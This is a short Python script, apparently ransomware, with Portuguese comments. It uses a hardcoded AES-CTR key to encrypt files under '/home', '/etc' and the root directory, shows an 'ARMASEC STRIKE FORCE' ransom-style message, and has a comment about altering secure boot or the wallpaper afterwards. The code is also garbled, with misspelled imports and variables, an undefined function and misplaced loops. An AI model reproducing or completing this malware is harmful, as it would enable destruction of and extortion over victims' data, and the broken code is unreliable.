#! /usr/bin/python3.10
# -*- coding: utf-8 -*-
from Crypter.Cipher import AES
from Crypto.Util import Counter
import  argparse
import os
import Discovery
import Crypter


#--------------
# A senha pode ter os seguintes tamanhos
#128/192/256 bits -1
#--------------


HARDCODED_KEY = '94e22f0886a16805abee289d7666bf71b2759b7c9070a7d957adb87ea2a91e95'

def arg_parser():
    parser = argparse.ArgumentParser(description="GentooLinux")
    parser.add_argument('-d', '--decrypt', help='decripta os arquivos [default: no]', action='store_true')
    return parser

def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args ['decrypt']

    if decrypt:
        print('ARMASEC STRIKE FORCE ')
        print('-----------------------------------------------------------------')
        print('Seus arquivos foram criptografados ')
        print('Para decripta-los utilize a seguinte senha {}'.format(HARDCODED_KEY))
        key = input('Digite a senha : ')
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

    ctr = Counter.new(256)
    crypt = AES.new(key,AES.MODE_CTR,Counter=ctr)

    if not decrypt:
        cryptFn = crypt.encrypt

    else:
        cryptFn = crypt.decrypt

        init_path = os.path.abspath(os.path.join(os.getcwd(),'files'))
        startDirs = [ init_path, '/home','/etc','/']

for currentdir in startDirs:
    for filename in Discovery.discover(currentdir):
        Crypter.change_files(filename,crytoFn)

#limpa a chave de criptografia da memoria

for _ in range(100):
    pass
if not decrypt :

    #codigo da zueira aqui


    pass
# Ápos a encriptação, voce pode alterar o secure boot , wallpaper


if __name__=='__main__':
    main()

